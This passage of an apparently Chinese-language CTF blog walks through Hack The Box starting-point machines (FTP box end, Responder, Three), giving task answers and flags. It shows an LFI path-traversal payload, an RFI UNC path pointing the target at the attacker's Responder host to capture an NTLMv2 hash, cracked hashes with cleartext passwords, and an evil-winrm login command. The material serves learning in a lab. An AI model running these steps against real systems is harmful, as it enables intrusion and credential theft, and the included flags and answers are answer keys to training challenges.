class="hljs-keyword">is</span> returned <span class="hljs-keyword">to</span> us <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Anonymous FTP login allowed&quot;</span> message?<br>:<span class="hljs-number">230</span><br></code></pre></td></tr></table></figure><h3 id="Task-4-2"><a href="#Task-4-2" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">After connecting <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> FTP server <span class="hljs-keyword">using</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">ftp</span> client, what username <span class="hljs-built_in">do</span> we provide when prompted <span class="hljs-built_in">to</span> <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> anonymously?<br>:anonymous<br></code></pre></td></tr></table></figure><h3 id="Task-5-2"><a href="#Task-5-2" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">After</span> connecting <span class="hljs-keyword">to</span> the FTP <span class="hljs-keyword">server</span> anonymously, what command can we use <span class="hljs-keyword">to</span> download the files we find <span class="hljs-keyword">on</span> the FTP <span class="hljs-keyword">server</span>?<br>:<span class="hljs-keyword">get</span><br></code></pre></td></tr></table></figure><h3 id="Task-6-2"><a href="#Task-6-2" class="headerlink" title="Task 6"></a>Task 6</h3><p>ç”¨ <code>get</code> ä¼ ä¸‹æ¥ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ <code>admin</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/bb5a428db75020be.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-literal">one</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> higher-privilege sounding usernames <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;allowed.userlist&#x27;</span> that we download <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> FTP server?<br>:admin<br></code></pre></td></tr></table></figure><h3 id="Task-7-2"><a href="#Task-7-2" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> Apache HTTP Server <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> target host?<br>:Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span><br></code></pre></td></tr></table></figure><h3 id="Task-8-1"><a href="#Task-8-1" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">What <span class="hljs-keyword">switch</span> can we <span class="hljs-keyword">use</span> <span class="hljs-keyword">with</span> Gobuster to specify we are looking <span class="hljs-keyword">for</span> specific filetypes?<br>:-x<br></code></pre></td></tr></table></figure><h3 id="Task-9-1"><a href="#Task-9-1" class="headerlink" title="Task 9"></a>Task 9</h3><p>æ‰«ç›®å½•æ‰«åˆ° <code>login.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/817d73711a6e521a.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which PHP <span class="hljs-built_in">file</span> can we identify <span class="hljs-keyword">with</span> <span class="hljs-built_in">directory</span> brute force that will provide <span class="hljs-keyword">the</span> opportunity <span class="hljs-built_in">to</span> authenticate <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> web service?<br>:login.php<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-2"><a href="#Submit-Flag-2" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>æŠŠ <code>allowed.userlist.passwd</code> ä¼ ä¸‹æ¥ï¼Œé‡Œé¢æœ‰å¯†ç ï¼Œä½¿ç”¨ <code>admin:rKXM59ESxesUFHAd</code> ç™»å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/666a284f93314fa3.png"></p><p>è¿›å»å°±æ˜¯ flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/871d943e7b05148c.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:c7110277ac44d78b6a9fff2232434d16<br></code></pre></td></tr></table></figure><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Task-1-3"><a href="#Task-1-3" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# <span class="hljs-keyword">nmap</span> -sS -sV -Pn <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">01</span>:<span class="hljs-number">52</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.37</span>s latency).<br>Not shown: <span class="hljs-number">999</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span><span class="hljs-keyword">m</span> PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è®¿é—® 80 ç«¯å£</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">When visiting <span class="hljs-keyword">the</span> web service <span class="hljs-keyword">using</span> <span class="hljs-keyword">the</span> IP address, what is <span class="hljs-keyword">the</span> domain that we are being redirected <span class="hljs-built_in">to</span>?<br>:unika.htb<br></code></pre></td></tr></table></figure><h3 id="Task-2-3"><a href="#Task-2-3" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which scripting <span class="hljs-keyword">language</span> <span class="hljs-keyword">is</span> being used <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">to</span> generate webpages?<br>:php<br></code></pre></td></tr></table></figure><h3 id="Task-3-3"><a href="#Task-3-3" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">URL</span> parameter which is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> different language versions <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> webpage?<br>:page<br></code></pre></td></tr></table></figure><h3 id="Task-4-3"><a href="#Task-4-3" class="headerlink" title="Task 4"></a>Task 4</h3><p>æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI)ï¼Œå°±æ˜¯è¯»å–ä¸€äº›ç³»ç»Ÿæœ¬åœ°çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¸€èˆ¬é€šè¿‡è·¯å¾„æ¥è¯»å–</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">Which of the following values <span class="hljs-keyword">for</span> the `page` <span class="hljs-keyword">parameter</span> would <span class="hljs-comment">be an example of exploiting a Local File Include (LFI) vulnerability:</span> <span class="hljs-comment">&quot;french.html&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;//10.10.14.6/somefile&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;../../../../../../../../windows/system32/drivers/etc/hosts&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;minikatz.exe&quot;</span><br>:../../../../../../../../windows/system32/drivers/etc/hosts<br></code></pre></td></tr></table></figure><h3 id="Task-5-3"><a href="#Task-5-3" class="headerlink" title="Task 5"></a>Task 5</h3><p>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œå‚æ•°ä¸€èˆ¬æ˜¯ä¸€ä¸ªè¿œç¨‹çš„ url åœ°å€</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">Which</span> of the following values <span class="hljs-keyword">for</span> the `page` parameter would be <span class="hljs-keyword">an</span> example of exploiting a Remote <span class="hljs-keyword">File</span> <span class="hljs-keyword">Include</span> (RFI) vulnerability: <span class="hljs-string">&quot;french.html&quot;</span>, <span class="hljs-string">&quot;//10.10.14.6/somefile&quot;</span>, <span class="hljs-string">&quot;../../../../../../../../windows/system32/drivers/etc/hosts&quot;</span>, <span class="hljs-string">&quot;minikatz.exe&quot;</span><br>:<span class="hljs-comment">//10.10.14.6/somefile</span><br></code></pre></td></tr></table></figure><h3 id="Task-6-3"><a href="#Task-6-3" class="headerlink" title="Task 6"></a>Task 6</h3><p>ç®€å•äº†è§£äº†ä¸€ä¸‹ NTLMï¼ŒNew Technology LAN Managerï¼Œæ˜¯å¾®è½¯ç”¨äº Windows èº«ä»½éªŒè¯çš„ä¸€ä¸ªåè®®ã€‚å®˜æ–¹è¯´çš„æ˜¯ï¼š</p><p> NTLM èº«ä»½éªŒè¯åè®®æ ¹æ®ä¸€ç§è¯æ˜æ˜¯æœåŠ¡å™¨æˆ–åŸŸæ§åˆ¶å™¨çš„æŒ‘æˆ˜&#x2F;å“åº”æœºåˆ¶å¯¹ç”¨æˆ·å’Œè®¡ç®—æœºè¿›è¡Œèº«ä»½éªŒè¯ï¼Œç”¨æˆ·è¦çŸ¥é“è¯¥æœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨çš„ä¸å¸æˆ·å…³è”çš„å¯†ç ã€‚ åœ¨ä½¿ç”¨ NTLM åè®®æ—¶ï¼Œæ¯å½“éœ€è¦æ–°çš„è®¿é—®ä»¤ç‰Œæ—¶ï¼Œèµ„æºæœåŠ¡å™¨å¿…é¡»æ‰§è¡Œä»¥ä¸‹æ“ä½œä¹‹ä¸€æ¥éªŒè¯è®¡ç®—æœºæˆ–ç”¨æˆ·çš„èº«ä»½ï¼š</p><ul><li>å¦‚æœè®¡ç®—æœºæˆ–ç”¨æˆ·çš„å¸æˆ·æ˜¯åŸŸå¸æˆ·ï¼Œè¯·è”ç³»åŸŸæ§åˆ¶å™¨çš„éƒ¨é—¨åŸŸè®¤è¯æœåŠ¡æ¥è·å–è¯¥å¸æˆ·çš„åŸŸã€‚</li><li>å¦‚æœè¯¥è®¡ç®—æœºæˆ–ç”¨æˆ·çš„å¸æˆ·æ˜¯æœ¬åœ°å¸æˆ·ï¼Œè¯·åœ¨æœ¬åœ°å¸æˆ·æ•°æ®åº“ä¸­æŸ¥æ‰¾è¯¥å¸æˆ·ã€‚</li></ul><p>å®˜æ–¹ç¡®å®å¤ªå®˜æ–¹äº†ï¼Œè¯´ç™½äº†å°±æ˜¯ <code>challenge/response</code> è®¤è¯æœºåˆ¶åœ¨éªŒè¯ç”¨æˆ·çš„è¿‡ç¨‹ä¸­æ˜¯ä¸éœ€è¦ä¼ è¾“ç”¨æˆ·çš„æ˜æ–‡å¯†ç çš„ã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">What does NTLM stand <span class="hljs-keyword">for</span>?<br>:<span class="hljs-keyword">New</span> Technology LAN Manager<br></code></pre></td></tr></table></figure><h3 id="Task-7-3"><a href="#Task-7-3" class="headerlink" title="Task 7"></a>Task 7</h3><p>Responder æ˜¯ä¸€æ¬¾å°‘æœ‰çš„å¯ä»¥é€šè¿‡ä¸­ç»§ NTLMv2å“ˆå¸Œæ¥è·å–ç½‘ç»œä¸­æœºå™¨çš„ shell è®¿é—®æƒé™çš„å†…ç½‘å·¥å…·ï¼Œè¯¦ç»†äº†è§£å¯ä»¥çœ‹  <a href="https://ew1z4rd.github.io/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/">https://ew1z4rd.github.io/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/</a> è¿™ç¯‡æ–‡ç« ï¼Œè¿™ä¸ªå·¥å…· kali è‡ªå¸¦</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Which</span> flag <span class="hljs-keyword">do</span> we <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> the <span class="hljs-title class_">Responder</span> utility to specify the network interface?<br><span class="hljs-symbol">:-I</span><br></code></pre></td></tr></table></figure><h3 id="Task-8-2"><a href="#Task-8-2" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">There are several tools <span class="hljs-keyword">that</span> take a NetNTLMv2 challenge/response <span class="hljs-keyword">and</span> <span class="hljs-keyword">try</span> millions <span class="hljs-keyword">of</span> passwords <span class="hljs-keyword">to</span> see <span class="hljs-keyword">if</span> any <span class="hljs-keyword">of</span> them generate <span class="hljs-keyword">the</span> same response. One such tool <span class="hljs-keyword">is</span> often referred <span class="hljs-keyword">to</span> <span class="hljs-keyword">as</span> `john`, <span class="hljs-keyword">but</span> <span class="hljs-keyword">the</span> full <span class="hljs-built_in">name</span> <span class="hljs-keyword">is</span> what?.<br>:John The Ripper<br></code></pre></td></tr></table></figure><h3 id="Task-9-2"><a href="#Task-9-2" class="headerlink" title="Task 9"></a>Task 9</h3><p>æŒ‡å®š </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶è®©å®ƒæŠ¥é”™</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//u</span>nika.htb<span class="hljs-regexp">/?page=/</span><span class="hljs-regexp">/10.10.16.51/</span>butt3rf1y<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cb8b139a7a41f58e.png"></p><p>æŠŠ <code>Hash</code> é‚£ä¸²å¤åˆ¶ä¸‹æ¥çˆ†ç ´ï¼Œä½†æ˜¯æˆ‘ç”¨ john ç ´è§£çš„æ—¶å€™å‡ºç°äº†å¦‚ä¸‹æŠ¥é”™</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# john b.txt<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br><span class="hljs-keyword">No</span> <span class="hljs-keyword">password</span> hashes left <span class="hljs-keyword">to</span> crack (see FAQ)<br></code></pre></td></tr></table></figure><p>æŸ¥äº†ä¸€ç•ªæ‰çŸ¥é“ï¼Œè¿™ä¸ªæŠ¥é”™åŸå› æ˜¯å› ä¸ºè¿™ä¸ªæ–‡ä»¶è¢«ç ´è§£è¿‡ï¼ˆå“ªæ¥çš„å•Šï¼Ÿï¼Ÿï¼Ÿwhyï¼Ÿï¼Ÿï¼Ÿï¼‰ï¼Œç»“æœå°±åœ¨ john.pot ä¸­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[<span class="hljs-regexp">/home/</span>butt3rf1y]<br>â””â”€<span class="hljs-comment"># cat ~/.john/john.pot</span><br><span class="hljs-variable">$P</span><span class="hljs-variable">$BtP9ZghJTwDfSn1gKKc</span>.k3mq4Vo.Ko/:<span class="hljs-number">104567</span><br><span class="hljs-variable">$NETNTLMv2</span><span class="hljs-variable">$ADMINISTRATORRESPONDER</span><span class="hljs-variable">$25d61c9246d5479b</span><span class="hljs-variable">$1d382c449a1d964839832984788288f4</span><span class="hljs-variable">$010100000000000080b7bdeb8282db01d76b82bee9aff7d70000000002000800340059004d00370001001e00570049004e002d00470050004b0032004f0054005600460030004800360004003400570049004e002d00470050004b0032004f005400560046003000480036002e00340059004d0037002e004c004f00430041004c0003001400340059004d0037002e004c004f00430041004c0005001400340059004d0037002e004c004f00430041004c000700080080b7bdeb8282db01060004000200000008003000300000000000000001000000002000005ac722d42e809e0b0701cfcf2610b582b82cb93eb9627709f712e596b9e1fec00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00350031000000000000000000</span>:badminton<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç”¨ â€“show æ¥æŸ¥çœ‹</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[<span class="hljs-regexp">/home/butt</span>3rf1y]<br>â””â”€<span class="hljs-comment"># john --show b.txt</span><br><span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:badminton</span><span class="hljs-symbol">:RESPONDER</span><span class="hljs-symbol">:</span>25<span class="hljs-symbol">d61c9246d5479b:</span>1<span class="hljs-symbol">D382C449A1D964839832984788288F4:</span>010100000000000080B7BDEB8282DB01D76B82BEE9AFF7D70000000002000800340059004D00370001001E00570049004E002D00470050004B0032004F0054005600460030004800360004003400570049004E002D00470050004B0032004F005400560046003000480036002E00340059004D0037002E004C004F00430041004C0003001400340059004D0037002E004C004F00430041004C0005001400340059004D0037002E004C004F00430041004C000700080080B7BDEB8282DB01060004000200000008003000300000000000000001000000002000005AC722D42E809E0B0701CFCF2610B582B82CB93EB9627709F712E596B9E1FEC00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350031000000000000000000<br></code></pre></td></tr></table></figure><p>å¯†ç æ˜¯ <code>badminton</code> </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the administrator <span class="hljs-keyword">user</span>?<br>:badminton<br></code></pre></td></tr></table></figure><h3 id="Task-10-1"><a href="#Task-10-1" class="headerlink" title="Task 10"></a>Task 10</h3><p>nmap æ‰«</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">We<span class="hljs-comment">&#x27;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</span><br>:<span class="hljs-number">5985</span><br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-3"><a href="#Submit-Flag-3" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>5985 ä¸»è¦æ˜¯ <code>WinRM</code>ï¼ˆWindows Remote Managementdï¼‰,Windows çš„è¿œç¨‹ç®¡ç†ï¼Œä½¿ç”¨ WinRM å¯ä»¥åœ¨å¯¹æ–¹æœ‰è®¾ç½®é˜²ç«å¢™çš„æƒ…å†µä¸‹è¿œç¨‹ç®¡ç†è¿™å°æœåŠ¡å™¨ï¼Œå› ä¸ºå¯åŠ¨ WinRM æœåŠ¡åï¼Œé˜²ç«å¢™é»˜è®¤ä¼šæ”¾è¡Œ 5985 ç«¯å£ã€‚</p><p><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>ï¼Œkali è‡ªå¸¦</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span> -u administrator -<span class="hljs-selector-tag">p</span> badminton<br></code></pre></td></tr></table></figure><p>ç™»è¿›å»ä¹‹åå‘ç°å•¥ä¹Ÿæ²¡æœ‰ï¼Œä¸€ç›´æ‰¾ï¼Œæ‰¾åˆ°äº†ä¸ª <code>mike</code> ç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/20560db0a57c4adb.png"></p><p>åœ¨ <code>mike</code> ç”¨æˆ·ä¸‹æ‰¾åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/47ed4fe5b5551c29.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:ea81b7afddd03efaa0945333ed147fac<br></code></pre></td></tr></table></figure><h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Task-1-4"><a href="#Task-1-4" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€<span class="hljs-comment"># nmap -sS -sV -Pn 10.129.131.234</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-19</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.131</span><span class="hljs-number">.234</span><br>Host is up (<span class="hljs-number">0.50</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.7</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.29</span> ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">16.03</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:2<br></code></pre></td></tr></table></figure><h3 id="Task-2-4"><a href="#Task-2-4" class="headerlink" title="Task 2"></a>Task 2</h3><p><img src="https://img.dkdun.cn/v1/2025/12/8b55f16dce97c2ef.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> domain <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> email address provided <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Contact&quot;</span> section <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> website?<br>:thetoppers.htb<br></code></pre></td></tr></table></figure><h3 id="Task-3-4"><a href="#Task-3-4" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">In <span class="hljs-keyword">the</span> absence <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> DNS server, which Linux <span class="hljs-built_in">file</span> can we use <span class="hljs-built_in">to</span> <span class="hljs-built_in">resolve</span> hostnames <span class="hljs-built_in">to</span> IP addresses <span class="hljs-keyword">in</span> order <span class="hljs-built_in">to</span> be able <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> websites that point <span class="hljs-built_in">to</span> those hostnames?<br>:/etc/hosts<br></code></pre></td></tr></table></figure><h3 id="Task-4-4"><a href="#Task-4-4" class="headerlink" title="Task 4"></a>Task 4</h3><p>ç”¨ gobuster æ‰«æ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster vhost -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt -u http:<span class="hljs-regexp">//</span>thetoppers.htb  --append-domain<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f53fb6547ca682e2.png"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">Which<span class="hljs-built_in"> sub-domain </span>is discovered during further enumeration?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:s3</span>.thetoppers.htb<br></code></pre></td></tr></table></figure><h3 id="Task-5-4"><a href="#Task-5-4" class="headerlink" title="Task 5"></a>Task 5</h3><p>åªæœ‰ä¸€æ¡ json ä¿¡æ¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/848b7df5aaf46e7f.png"></p><p>æœäº†ä¸€ä¸‹ s3ï¼ŒAmazon S3, å…¨å Amazon Simple Storage Serviceï¼ŒAmazon æä¾›çš„ç½‘ç»œæ•°æ®å­˜å‚¨æœåŠ¡</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Which service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> discovered sub-domain?<br>:Amazon S3<br></code></pre></td></tr></table></figure><h3 id="Task-6-4"><a href="#Task-6-4" class="headerlink" title="Task 6"></a>Task 6</h3><p>å¯ä»¥é€šè¿‡ AWSCLI æ¥ä¸ s3 è¿›è¡Œäº¤äº’ï¼Œå…·ä½“è¯·çœ‹ <a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-welcome.html">AWS CLI</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which command <span class="hljs-type">line</span> utility can be used <span class="hljs-keyword">to</span> interact <span class="hljs-keyword">with</span> the service running <span class="hljs-keyword">on</span> the discovered sub-<span class="hljs-keyword">domain</span>?<br>:awscli<br></code></pre></td></tr></table></figure><h3 id="Task-7-4"><a href="#Task-7-4" class="headerlink" title="Task 7"></a>Task 7</h3><p>å…·ä½“çœ‹å®˜æ–¹æ–‡æ¡£</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">Which <span class="hljs-keyword">command</span> <span class="hljs-keyword">is</span> used <span 